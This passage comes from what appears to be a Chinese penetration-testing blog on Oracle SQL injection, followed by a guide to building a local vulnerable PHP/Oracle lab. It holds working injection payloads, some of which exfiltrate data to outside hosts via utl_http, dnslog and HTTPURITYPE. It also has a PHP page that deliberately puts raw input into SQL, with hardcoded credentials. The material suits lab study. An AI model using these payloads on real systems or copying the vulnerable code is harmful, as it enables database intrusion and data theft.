class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#使用substr截断，逐个字段进行猜解</span><br><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) -- </span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,2,1),&#x27;Y&#x27;,1,0) from dual) -- </span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,3,1),&#x27;S&#x27;,1,0) from dual) --</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,4,1),&#x27;T&#x27;,1,0) from dual) --</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,5,1),&#x27;E&#x27;,1,0) from dual) --</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,6,1),&#x27;M&#x27;,1,0) from dual) --</span><br><span class=\"line\"></span><br><span class=\"line\">#当然也可以配合ascii码进行猜解</span><br><span class=\"line\">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,1,0) from dual) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366490187-723fa9dc-c6d7-4858-a429-d98bbe77cab4.png#align=left&display=inline&height=436&margin=%5Bobject%2Object%5D&name=image.png&originHeight=872&originWidth=2424&size=197040&status=done&style=none&width=1212\" alt=\"image.png\"></p>\n<h2 id=\"2、instr函数布尔盲注\"><a href=\"#2、instr函数布尔盲注\" class=\"headerlink\" title=\"2、instr函数布尔盲注\"></a>2、instr函数布尔盲注</h2><p>instr函数的应用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select instr(&#x27;abcdefgh&#x27;,&#x27;de&#x27;) position from dual;</span><br><span class=\"line\">#返回结果：4</span><br></pre></td></tr></table></figure>\n<p>盲注中的应用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),&#x27;SYS&#x27;)) --</span><br><span class=\"line\">?id=1 and 4=(instr((select user from dual),&#x27;T&#x27;)) --</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x06-延时盲注\"><a href=\"#0x06-延时盲注\" class=\"headerlink\" title=\"0x06 延时盲注\"></a>0x06 延时盲注</h1><h2 id=\"1、检测漏洞存在\"><a href=\"#1、检测漏洞存在\" class=\"headerlink\" title=\"1、检测漏洞存在\"></a>1、检测漏洞存在</h2><p>DBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。<br>具体用法为：<strong>DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)</strong><br><strong>pipename</strong>为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。<br><strong>timeout</strong>为integer的可选输入参数，用来指定等待时间。<br>常用payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)--</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627365780661-fefb7bcc-e426-4014-8c09-9803fbb76335.png#align=left&display=inline&height=421&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=2528&size=312249&status=done&style=none&width=1264\" alt=\"image.png\"><br>如果页面延时10秒返回，即存在注入。</p>\n<h2 id=\"2、配合decode函数延时盲注\"><a href=\"#2、配合decode函数延时盲注\" class=\"headerlink\" title=\"2、配合decode函数延时盲注\"></a>2、配合decode函数延时盲注</h2><p>只需要将延时语句放入decode函数中即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#直接猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br><span class=\"line\"></span><br><span class=\"line\">#通过ascii猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366016814-7d8cdee4-c932-4907-87e0-017ae7f6296f.png#align=left&display=inline&height=506&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1012&originWidth=2146&size=293305&status=done&style=none&width=1073\" alt=\"image.png\"></p>\n<h2 id=\"3、使用其他延时查询来判断\"><a href=\"#3、使用其他延时查询来判断\" class=\"headerlink\" title=\"3、使用其他延时查询来判断\"></a>3、使用其他延时查询来判断</h2><p>如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#直接猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --</span><br><span class=\"line\"></span><br><span class=\"line\">#通过ascii猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x07-外带数据注入\"><a href=\"#0x07-外带数据注入\" class=\"headerlink\" title=\"0x07 外带数据注入\"></a>0x07 外带数据注入</h1><h2 id=\"1、url-http-request\"><a href=\"#1、url-http-request\" class=\"headerlink\" title=\"1、url_http.request()\"></a>1、url_http.request()</h2><p>使用此方法，用户需要有utl_http访问网络的权限<br>首先检测是否支持，页面返回正常则表示支持</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464342525-e4cd81f2-77a8-4a90-ace7-36aa714ccdaa.png#align=left&display=inline&height=369&margin=%5Bobject%2Object%5D&name=image.png&originHeight=738&originWidth=1854&size=42432&status=done&style=none&width=927\" alt=\"image.png\"><br>然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 4455</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464776325-cd84daca-3f18-48a5-86a3-9a92df1fdd05.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&name=image.png&originHeight=290&originWidth=1144&size=47561&status=done&style=none&width=572\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#子查询数据库版本信息并访问python起的http服务</span><br><span class=\"line\">?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;||(select banner from sys.v_$version where rownum=1))=1--</span><br><span class=\"line\"></span><br><span class=\"line\">#http访问时可以将||进行URL编码</span><br><span class=\"line\">?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;%7C%7C(select banner from sys.v_$version where rownum=1))=1--</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464897258-175be638-08f8-4355-8ce8-e2552bfdd355.png#align=left&display=inline&height=372&margin=%5Bobject%2Object%5D&name=image.png&originHeight=744&originWidth=1868&size=59899&status=done&style=none&width=934\" alt=\"image.png\"><br>可以看到成功获取了数据<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464921197-61542222-97e4-4941-b1d9-ca5bdcec6fe2.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1454&size=124719&status=done&style=none&width=727\" alt=\"image.png\"></p>\n<h2 id=\"2、utl-inaddr-get-host-address-函数\"><a href=\"#2、utl-inaddr-get-host-address-函数\" class=\"headerlink\" title=\"2、utl_inaddr.get_host_address()函数\"></a>2、utl_inaddr.get_host_address()函数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#使用dnslog外带数据</span><br><span class=\"line\">?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465955162-98de91a3-8382-4073-bcf3-18728762e3f1.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1664&size=42677&status=done&style=none&width=832\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465968725-e5b0236e-0e8d-4aa2-8556-eb6fbf6e935f.png#align=left&display=inline&height=283&margin=%5Bobject%2Object%5D&name=image.png&originHeight=566&originWidth=1680&size=59996&status=done&style=none&width=840\" alt=\"image.png\"></p>\n<h2 id=\"3、SYS-DBMS-LDAP-INIT-函数\"><a href=\"#3、SYS-DBMS-LDAP-INIT-函数\" class=\"headerlink\" title=\"3、SYS.DBMS_LDAP.INIT()函数\"></a>3、SYS.DBMS_LDAP.INIT()函数</h2><p>网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1 and (select DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --</span><br></pre></td></tr></table></figure>\n<h2 id=\"4、HTTPURITYPE-函数\"><a href=\"#4、HTTPURITYPE-函数\" class=\"headerlink\" title=\"4、HTTPURITYPE()函数\"></a>4、HTTPURITYPE()函数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select HTTPURITYPE(&#x27;http://192.168.100.130:4455/&#x27;||(select user from dual)).GETCLOB() FROM DUAL)is not null --</span><br></pre></td></tr></table></figure>\n<p>同样需要python起一个http服务，或者nc创建监听<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466748565-80964d64-450b-46fc-8f89-77bdb55ce3cd.png#align=left&display=inline&height=419&margin=%5Bobject%2Object%5D&name=image.png&originHeight=838&originWidth=1878&size=78666&status=done&style=none&width=939\" alt=\"image.png\"><br>虽然访问404，但是同样成功外带数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466760517-a4a23a26-b2d0-4ea8-96c9-3a7c5470b395.png#align=left&display=inline&height=230&margin=%5Bobject%2Object%5D&name=image.png&originHeight=460&originWidth=1454&size=97022&status=done&style=none&width=727\" alt=\"image.png\"></p>\n<h1 id=\"0x08-总结\"><a href=\"#0x08-总结\" class=\"headerlink\" title=\"0x08 总结\"></a>0x08 总结</h1><p>Oracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。<br>以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～</p>\n"},{"title":"Oracle数据库注入环境搭建","keywords":"oracle数据库,环境搭建,sql注入","description":"Oracle数据库注入环境搭建","cover":"https://img0.baidu.com/it/u=3845303080,3279446310&fm=26&fmt=auto&gp=0.jpg","date":"2021-08-01T02:00:00.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 安装Oracle数据库\n\n1、首先下载数据库安装软件\n具体可以从参考这里，我是从他的百度云下载的\n[https://blog.csdn.net/qq_32786873/article/details/81187208](https://blog.csdn.net/qq_32786873/article/details/81187208)\n2、点击setup.exe安装即可\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627458559268-9d095175-6720-4b4b-9165-7cb60a3e855e.png#align=left&display=inline&height=252&margin=%5Bobject%2Object%5D&name=image.png&originHeight=504&originWidth=1570&size=61039&status=done&style=none&width=785)\n（安装过程不过多阐述，没什么太大区别，就下一步下一步即可）\n\n3、开启oracle数据库\n\n\n打开cmd，连接数据库\n```\nC:\\Users\\user>sqlplus\n请输入用户名:  system\n输入口令:\n连接到:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n```\n防止网络不通，建议关闭防火墙\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627453482798-3baff679-3b19-4f3c-a8c5-26dfa3fae74b.png#align=left&display=inline&height=401&margin=%5Bobject%2Object%5D&name=image.png&originHeight=802&originWidth=1310&size=91870&status=done&style=none&width=655)\n4、使用navicat连接数据库（system:root）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532220399-c06a2dc3-d502-4ac9-80bc-967625b716af.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=924&size=39243&status=done&style=none&width=462)\n5、也可以使用sql plus新建用户\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539624468-51a70f51-77bb-41a8-b3e6-598cd7784f7c.png#align=left&display=inline&height=623&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1246&originWidth=532&size=300224&status=done&style=none&width=266)\n# 0x02 安装phpstudy\n1、phpstudy下载地址如下：\n[http://public.xp.cn/upgrades/phpStudy20161103.zip](http://public.xp.cn/upgrades/phpStudy20161103.zip)\n这里推荐使用2016版本，因为我使用2018死活搭不成功\n安装过程很简单，设置安装路径，下一步下一步即可。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532525123-7fe22127-8c82-43e8-a3fc-3b90bdcb9888.png#align=left&display=inline&height=448&margin=%5Bobject%2Object%5D&name=image.png&originHeight=896&originWidth=1216&size=57968&status=done&style=none&width=608)\n2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532565418-c2f0a01f-ea23-4f42-aa37-4e4f223c25e9.png#align=left&display=inline&height=386&margin=%5Bobject%2Object%5D&name=image.png&originHeight=772&originWidth=1294&size=391925&status=done&style=none&width=647)\n（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：[https://www.php.cn/xiazai/download/1481](https://www.php.cn/xiazai/download/1481)）\n3、安装完之后，打开phpinfo\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532770453-b48b361b-6115-40e8-a802-86b3415379eb.png#align=left&display=inline&height=518&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1036&originWidth=1314&size=485815&status=done&style=none&width=657)\n也可以像我这样在C:\\phpStudy\\WWW目录下新建phpinfo.php文件，内容为：\n```php\n<?php phpinfo();?>\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532747143-dc367dc0-4a13-4e24-bbc7-7bd518e2e334.png#align=left&display=inline&height=364&margin=%5Bobject%2Object%5D&name=image.png&originHeight=728&originWidth=1360&size=164284&status=done&style=none&width=680)\n这里看到是32位的。\n# 0x03 设置oci8扩展\n（这里我是死活不成功，弄了半天）\n1、首先在C:\\phpStudy\\php\\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532987042-08f559fe-42a9-4dc3-a3c1-a1a88232b380.png#align=left&display=inline&height=476&margin=%5Bobject%2Object%5D&name=image.png&originHeight=952&originWidth=2644&size=213841&status=done&style=none&width=1322)\n2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：\n[https://www.it1352.com/1713162.html](https://www.it1352.com/1713162.html)\n在php路径下，打开cmd，输入如下命令：\n```php\nC:\\phpStudy\\php\\php-5.5.38>php.exe -m\nPHP Warning:  PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\n\nWarning: PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\nPHP Warning:  PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll' - %1 不是有 效的 Win32 应用程序。\n in Unknown on line 0\n\nWarning: PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\nPHP Warning:  PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\n\nWarning: PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537664336-d0f1cbff-e217-415e-9c3f-c6afea1e1fff.png#align=left&display=inline&height=520&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1040&originWidth=1950&size=176001&status=done&style=none&width=975)\n3、根据文章中所说，安装**oracle instantclient**，链接如下：\n[https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html](https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html)\n因为数据库是11g的，所以安装11.1.x版本\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537791843-1b689f65-de26-4d29-b36f-e8269d9c9f08.png#align=left&display=inline&height=521&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1042&originWidth=2708&size=209242&status=done&style=none&width=1354)\n4、下载好之后解压，放入C:\\instantclient_11_1\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537838346-438837f0-196f-46f5-8263-80481facf640.png#align=left&display=inline&height=453&margin=%5Bobject%2Object%5D&name=image.png&originHeight=906&originWidth=1606&size=161187&status=done&style=none&width=803)\n5、设置环境变量，这一步很重要\n在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537919273-db8cc709-d63f-4f9b-8e73-3bb5f8e5ec67.png#align=left&display=inline&height=647&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1294&originWidth=2468&size=515243&status=done&style=none&width=1234)\n增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538045153-7b63740e-1dbf-4c66-bb39-3bd4c7092ff7.png#align=left&display=inline&height=511&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1022&originWidth=1046&size=77568&status=done&style=none&width=523)\n6、验证，在cmd命令提示符中输入\n```php\nwhere oci*\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539303726-33a0ea0d-eb8f-4dbe-a896-e17bcb58e6e5.png#align=left&display=inline&height=188&margin=%5Bobject%2Object%5D&name=image.png&originHeight=376&originWidth=1084&size=59269&status=done&style=none&width=542)\n出现instantclient的路径即可。\n7、重启计算机\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538340688-e470a2bb-38ed-4f82-88cb-9c554e1e534d.png#align=left&display=inline&height=355&margin=%5Bobject%2Object%5D&name=image.png&originHeight=710&originWidth=974&size=18334&status=done&style=none&width=487)\n8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可）\n```php\nphp.exe --ri oci8\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539378014-1dd2ed2a-e160-456c-95e8-8454296e760d.png#align=left&display=inline&height=481&margin=%5Bobject%2Object%5D&name=image.png&originHeight=962&originWidth=1340&size=113244&status=done&style=none&width=670)\n9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539512949-f85db2c3-85b5-4da6-a1c4-3ad15f45dc16.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1580&size=78200&status=done&style=none&width=790)\n当出现如下界面，环境就已经基本搭建好了。\n# 0x04 创建漏洞测试环境\n## 1、 建立存在漏洞数据\n1、首先使用navicat连接数据库\n（这里有一个坑，连接时可能会出现oracle library is not loaded）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539961158-a91d2a49-c1a1-402d-a3a8-3b8a5cbb8620.png#align=left&display=inline&height=397&margin=%5Bobject%2Object%5D&name=image.png&originHeight=794&originWidth=1872&size=67558&status=done&style=none&width=936)\n在工具 - 选项处\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539811909-3ea4f232-baa8-491d-8de3-08a44e87ac54.png#align=left&display=inline&height=282&margin=%5Bobject%2Object%5D&name=image.png&originHeight=564&originWidth=1320&size=68308&status=done&style=none&width=660)\n修改oci环境，选择之前数据库安装的路径，修改完后记得重启\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540060849-0839d8a1-10c0-4b49-ba35-cd70e3a7c14b.png#align=left&display=inline&height=597&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1194&originWidth=1536&size=79187&status=done&style=none&width=768)\n2、连接数据库之后，选择相应的用户，我这里是SYSTEM\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540125339-60483bd9-5527-46c5-9fc2-b2394ddd0722.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=390&originWidth=946&size=30183&status=done&style=none&width=473)\n3、新建表TEST，设置如下字段\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540264141-c9cb7b96-558b-4cef-b015-5c25e97bd8d7.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1628&size=58227&status=done&style=none&width=814)\n4、添加如下数据（数据其实是任意的，随意添加即可）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540925893-509b0585-e42c-437f-a8cf-6d178dd23d4b.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&name=image.png&originHeight=470&originWidth=1358&size=43179&status=done&style=none&width=679)\n5、新建查询进行验证\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540945678-0b57f457-592c-4efd-aa13-a5ca5033ea8f.png#align=left&display=inline&height=457&margin=%5Bobject%2Object%5D&name=image.png&originHeight=914&originWidth=1530&size=59045&status=done&style=none&width=765)\n以上漏洞数据就简单搭建成功了。\n## 2、搭建PHP站点\n1、将源码保存为oracle.php文件，放到C:\\phpStudy\\WWW目录下\n源码如下：\n```php\n<?php\n  header(\"Content-Type:text/html;charset=utf-8\");\n  $id = @$_GET['id'];\n  $dbstr =\"(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))\"; //连接数据库的参数配置 \n  $conn = oci_connect('system','root',$dbstr);//连接数据库，前两个参数分别是账号和密码\n  if (!$conn)\n  {\n    $Error = oci_error();//错误信息\n    print htmlentities($Error['message']);\n    exit;\n  }\n  else\n  {\n    echo \"<h3>Oracle 注入测试靶场</h3>\".\"<br>\";\n    $sql = \"select * from TEST where id=\".$id;//sql查询语句\n\t  echo \"当前sql语句为：\".$sql.\"<br>\".\"<br>\";//输出sql查询语句\n    $ora_b = oci_parse($conn,$sql);  //编译sql语句 \n    oci_execute($ora_b,OCI_DEFAULT);  //执行 \n    while($r=oci_fetch_row($ora_b))  //取回结果 \n    { \n      $i=0;\n      echo \"Id:\".$r[$i++].\"  </t> <br>\";\n      echo \"Name:\".$r[$i++].\"  </t><br>  \";\n      echo \"Age:\".$r[$i++].\"  </t><br>  \";\n    }\n  }\n  oci_close($conn);//关闭连接\n?>\n```\n2、访问[http://localhost/oracle.php?id=1](http://localhost/oracle.php?id=1)，返回如下界面表示搭建成功，数据库也成功连接了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541521049-4e04787c-15b8-4686-a485-d5d2e03e9f3f.png#align=left&display=inline&height=340&margin=%5Bobject%2Object%5D&name=image.png&originHeight=680&originWidth=1342&size=55565&status=done&style=none&width=671)\n# 0x05 Oracle注入测试\n## 1、检测漏洞点\n```php\nhttp://localhost/oracle.php?id=1 and 1=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541538885-aab0d8c4-aafa-4511-897d-ab85f13130e2.png#align=left&display=inline&height=261&margin=%5Bobject%2Object%5D&name=image.png&originHeight=522&originWidth=1176&size=46725&status=done&style=none&width=588)\n```php\nhttp://localhost/oracle.php?id=1 and 1=2\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541558550-37db5cd6-20ef-4b68-a731-38eca533e8fb.png#align=left&display=inline&height=222&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=1072&size=38860&status=done&style=none&width=536)\n## 2、显错注入\n```php\nhttp://localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,'4' from dual --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541979564-ea8c20f1-051d-4998-ae63-8cc4c6caf50e.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1874&size=73845&status=done&style=none&width=937)\n## 3、报错注入\n```php\nhttp://localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542108099-2a4e87d2-214a-4809-9762-24e01b40471b.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2068&size=150069&status=done&style=none&width=1034)\n## 4、布尔盲注\n```php\nhttp://localhost/oracle.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542211017-7bbd5646-d87a-496e-abef-d67b929449ac.png#align=left&display=inline&height=348&margin=%5Bobject%2Object%5D&name=image.png&originHeight=696&originWidth=1774&size=76159&status=done&style=none&width=887)\n```php\nhttp://localhost/oracle.php?id=1 and 1=(select decode(user,'SSSSS',1,0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542229391-54e9c196-437c-464a-a1ee-565b21ccee2b.png#align=left&display=inline&height=174&margin=%5Bobject%2Object%5D&name=image.png&originHeight=574&originWidth=1752&size=66181&status=done&style=none&width=532)\n## 5、延时盲注\n```php\nhttp://localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542453679-5c200dec-7af1-485d-91a1-5230c4724937.png#align=left&display=inline&height=424&margin=%5Bobject%2Object%5D&name=image.png&originHeight=848&originWidth=2060&size=180765&status=done&style=none&width=1030)\n## 6、外带数据\n```php\nhttp://localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.pgx519.dnslog.cn') from dual)is not null 